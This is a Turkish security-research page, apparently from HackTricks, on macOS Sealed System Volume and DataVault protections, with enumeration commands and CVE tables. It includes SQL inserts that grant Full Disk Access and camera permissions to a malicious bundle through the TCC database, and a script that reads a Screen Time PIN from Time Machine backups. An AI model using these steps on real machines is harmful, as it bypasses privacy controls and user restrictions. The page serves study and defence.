# macOS Sealed System Volume ve DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Sealed System Volume (SSV)

### Temel Bilgiler

**macOS Big Sur (11.0)** sürümünden itibaren sistem birimi, **APFS snapshot hash tree** kullanılarak kriptografik olarak mühürlenir. Buna **Sealed System Volume (SSV)** denir. Sistem bölümü **salt okunur** olarak bağlanır ve herhangi bir değişiklik mührü bozar; bu durum önyükleme sırasında doğrulanır.<sup>[[11]](#references)</sup>

SSV şunları sağlar:
- **Kurcalama tespiti** — sistem ikililerinde/çerçevelerinde yapılan her değişiklik Merkle ağacının kökünü değiştirir ve Apple tarafından imzalanmış mührü geçersiz kılar
- **Önyükleme sırasında kimlik doğrulama** — önyükleme zinciri, seçilen sistem snapshot'ını kök dosya sistemi olmadan önce doğrular
- **Rootkit direnci** — root bile authenticated root'u devre dışı bırakmadan veya yetkili bir güncelleme yolunu ele geçirmeden, kimliği doğrulanmış sistem snapshot'ındaki dosyaları kalıcı olarak değiştiremez

SSV, **System** birimini korur; onunla eşleştirilmiş yazılabilir **Data** birimini korumaz. Firmlink'ler, her iki birimi de `/` konumunda görünen ad alanında birleştirir. Bu nedenle, yazılabilir görünen bir yol, alttaki nesnenin mühürlenmiş snapshot'a ait olduğunu kanıtlamaz. FileVault ve Data Protection, bekleyen verilerin gizliliğini korur; bunlar SSV bütünlüğünden ayrıdır.<sup>[[11]](#references)</sup>

### SSV Durumunu Kontrol Etme

```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / " 

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```

### Etkin sistem görünümü: SSV + Cryptex graft'leri

Yeni macOS sürümlerinde, `/System` altında görünen her executable mutlaka boot edilmiş SSV snapshot'ından gelmez. **Cryptex'ler**, içerikleri seçili dizinlerin üzerine graft edilen, ayrı olarak doğrulanmış APFS disk görüntüleridir; bu nedenle Rapid Security Responses, temel SSV'yi yeniden oluşturmadan güvenlik açısından hassas bileşenleri değiştirebilir. Persistence'ı incelerken veya sistem kodunu diff'lerken yalnızca temel snapshot'ı hash'lemek yerine canlı mount'ları ve Preboot Cryptex deposunu envantere alın:

```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```

Önyükleme zinciri ve Rapid Security Response ayrıntıları [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses) bölümünde ele alınmaktadır; bu bölüm yalnızca SSV sınırına odaklanır.

### SSV Yazıcı Yetkileri

Bazı Apple sistem ikili dosyaları, mühürlü sistem birimini değiştirmelerine veya yönetmelerine olanak tanıyan yetkilere sahiptir:

| Yetki | Amaç |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Sistem birimini önceki bir snapshot'a geri döndürmek |
| `com.apple.private.apfs.create-sealed-snapshot` | Sistem güncellemelerinden sonra yeni bir mühürlü snapshot oluşturmak |
| `com.apple.rootless.install.heritable` | SIP korumalı yollara yazmak (alt süreçler tarafından devralınır) |
| `com.apple.rootless.install` | SIP korumalı yollara yazmak |

### SSV Yazıcılarını Bulma

```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```

### Saldırı Senaryoları

#### Snapshot Rollback Attack

Bir saldırgan `com.apple.private.apfs.revert-to-snapshot` yetkisine sahip bir binary'yi ele geçirirse, **sistem birimini güncelleme öncesi bir duruma geri alarak** bilinen güvenlik açıklarını yeniden etkinleştirebilir:

```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```

> [!WARNING]
> Snapshot rollback, güvenlik güncellemelerini fiilen **geri alır** ve daha önce yamalanmış kernel ve sistem açıklarını geri yükler. Bu, modern macOS'ta yapılabilecek en tehlikeli işlemlerden biridir.

#### Sistem İkili Dosyalarını Değiştirme

SIP bypass + SSV yazma yetkisiyle saldırgan şunları yapabilir:

1. Sistem volume'unu okuma-yazma modunda bağlamak
2. Bir sistem daemon'unu veya framework kütüphanesini trojan'lı bir sürümle değiştirmek
3. Snapshot'ı yeniden mühürlemek (veya SIP zaten zayıflatılmışsa bozuk mührü kabul etmek)
4. Rootkit yeniden başlatmalardan sonra da kalıcı olur ve userland tespit araçlarına görünmez

### Gerçek Dünyadaki CVE'ler

| CVE | Açıklama |
|---|---|
| CVE-2021-30892 | **Shrootless** — `system_installd`'ın `com.apple.rootless.install.heritable` entitlement'ını kötüye kullanarak rastgele post-install script'leri çalıştıran SIP bypass ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | SIP bypass: `system_installd`, post-install script'ini `/tmp` altında SIP korumalı bir klasöre yerleştiriyordu; ancak `/tmp`'nin kendisi SIP korumalı olmadığından, üzerine bir image bağlanarak klasör değiştirilebiliyordu ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — XNU'da, salt okunur ve root'a ait dosyalara yazmaya olanak tanıyan copy-on-write race condition ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Temel Bilgiler

**DataVault**, hassas dosya ve dizinler için entitlement gerektiren bir dosya sistemi korumasıdır. BSD flag'i `UF_DATAVAULT` (`0x00000080`), bir nesnenin hem okunması hem de yazılması için entitlement gerektiğini belirtir; normal DAC'ten farklı olarak, koruma etkin durumdayken yalnızca **root** olmak veya Full Disk Access edinmek bu denetimi karşılamaz.<sup>[[4]](#references)[[13]](#references)</sup>

“DataVault”ı korumalı her veritabanının eş anlamlısı olarak kullanmayın. TCC veritabanları TCC/FDA ve SIP'e özgü politikalarla yönetilir (bkz. [macOS TCC](macos-tcc/README.md)); keychain öğelerine erişim de Keychain ACL'lerine ve kriptografik korumaya bağlıdır (bkz. [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Gerçek DataVault örnekleri genellikle Screen Time deposu gibi `/private/var/folders/.../0/` altındaki servislere ait depolarda görülür; üst dizin için `stat` çalıştırılabildiğinde BSD dosya flag'lerinde bu flag `datavault` olarak görünür.

### DataVault Denetleyici Entitlement'ları

| Entitlement | Sınır |
|---|---|
| `com.apple.rootless.datavault.controller` | `UF_DATAVAULT` nesnelerine erişme/yönetme<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | TCC kararlarını yönetme; bu, ilişkili ancak ayrı bir gizlilik sınırıdır |
| `com.apple.private.tcc.allow` | Entitlement değerinde belirtilen seçili TCC servislerini atlama |
| `com.apple.rootless.storage.TCC` | SIP korumalı TCC deposuna yazma |

DataVault denetleyici entitlement'ını FDA, yedekleme, indeksleme veya IPC işlevselliğiyle birleştiren bir süreç özellikle dikkat çekicidir: vault'u doğrudan açmaya çalışmak yerine, korumalı bir nesneyi sıradan bir yola kopyalayan bir confused-deputy primitive'i arayın.<sup>[[14]](#references)</sup>

### DataVault Denetleyicilerini Bulma

```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```

### Saldırı Senaryoları

#### TCC Veritabanının Doğrudan Değiştirilmesi (ayrı TCC sınırı)

Bir saldırgan TCC manager sürecini (ör. `com.apple.private.tcc.manager` taşıyan bir sürece code injection yoluyla) ele geçirirse, herhangi bir uygulamaya herhangi bir TCC izni vermek için **TCC veritabanını doğrudan değiştirebilir**:<sup>[[12]](#references)</sup>

```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```

> [!CAUTION]
> TCC veritabanının değiştirilmesi **nihai gizlilik atlatma yöntemidir** — herhangi bir izni sessizce, kullanıcıya istem göstermeden veya görünür bir belirti vermeden sağlar. Tarihsel olarak, birden fazla macOS ayrıcalık yükseltme zinciri, son payload olarak TCC veritabanına yazma işlemiyle sonuçlanmıştır.

#### Keychain Veritabanına Erişim

Bir keychain arka uç veritabanına ham erişim, gizli bilgilere düz metin olarak erişmekle aynı şey değildir. Başka bir ayrıcalık sınırı saldırganın veritabanını kopyalamasına izin verse bile, anahtar materyali ve öğe ACL'leri yine de saldırıya uğratılmalıdır; DataVault denetleyici yetkisinin yeterli olduğunu varsaymak yerine özel [macOS Keychain](../../macos-red-teaming/macos-keychain.md) sayfasına bakın.

#### Yedek kopya sınırı: Time Machine

2026'da yapılan bir analiz, faydalı bir genel kalıp ortaya koydu: `backupd`, korumalı depoları kopyalayabilmek için hem `com.apple.rootless.datavault.controller` hem de Full Disk Access yetkisine sahiptir. Test edilen yapılandırmada `/private/var/folders`, Time Machine yedeklemesine dahil edilmişti ve bağlanan yedek kopya, canlı DataVault sınırını uygulamıyordu. Araştırmacı bunu, canlı kasayı açmadan Screen Time SQLite deposunu bulmak ve kısıtlama PIN'ini düz metin olarak okumak için kullandı. Bunu bir **kopya sınırı saldırısı** olarak değerlendirin: kasa verilerini daha zayıf bir bağlama veya yola taşıyabilen yedekleme, dışa aktarma, geçiş, indeksleme ve tanılama yardımcılarını belirleyin.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```

Bu davranış sürüme ve yedekleme düzenine bağlıdır. Hedef build üzerinde doğrulayın ve şunu unutmayın: şifrelenmiş bir Time Machine hedefi kopyayı yalnızca kilitliyken korur; bağlandıktan sonra erişim denetimleri saldırı yüzeyinin bir parçası hâline gelir.

### DataVault/TCC Bypass İçeren Gerçek Dünyadaki CVE'ler

| CVE | Açıklama |
|---|---|
| CVE-2024-44131 | Ayrıcalıklı bir yardımcının TCC korumalı verilere erişmesini sağlayan FileProvider symlink race ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | Root olarak, **`NFSHomeDirectory` konumu saldırganın denetimindeki bir `TCC.db` dosyasına işaret eden yeni bir kullanıcı oluşturun**; oturum açıldığında `tccd` bu dosyayı kullanır ve izinler uygulanarak diğer kullanıcıların verilerine erişilir ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | "powerdir": saldırganın denetimindeki bir TCC.db dosyasını yerleştirmek için kullanıcının ana dizinini değiştirme ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Bir uygulamanın istem gösterilmeden **bir bağışçı bundle'ın TCC izinlerini devralmasını** sağlayan bundle-conclusion hatası; gerçek saldırılarda masaüstünün ekran görüntüsünü almak için **XCSSET** tarafından kullanıldı ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd`, DB yolunu `$HOME` üzerinden oluşturuyordu; bu nedenle `launchctl setenv HOME` ile yol saldırganın denetimindeki bir `TCC.db` dosyasına yönlendirilebiliyordu ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod`, `com.apple.private.tcc.manager` yetkisine sahipti **ve** library validation özelliğini devre dışı bırakmıştı; bu nedenle `/Library/Audio/Plug-Ins/HAL` konumuna bırakılan bir HAL plug-in'i rastgele TCC izinleri verebiliyordu ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft, macOS'ta System Integrity Protection'ı aşabilen yeni bir güvenlik açığı olan Shrootless'ı buldu](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Teknik Analiz: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Kötü Yapmaya Değer](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Veri Koruma](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass, iCloud'dan veri çalıyor](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - macOS Malware'ı Ortaya Çıkarmak: TCC'yi Bypass Etme](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Yeni macOS güvenlik açığı "powerdir", kullanıcı verilerine yetkisiz erişime yol açabilir](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [XCSSET malware'ında Zero-Day TCC bypass keşfedildi](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework'ünü Bypass Etme](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Müziği çal ve TCC'yi bypass et, diğer adıyla CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [Apple OTA Güncellemelerinin Kabusu (APFS Snapshots)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [Kendi Screen Time parolanızı bypass etme — kaynak kodu ve Time Machine/DataVault analizi](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
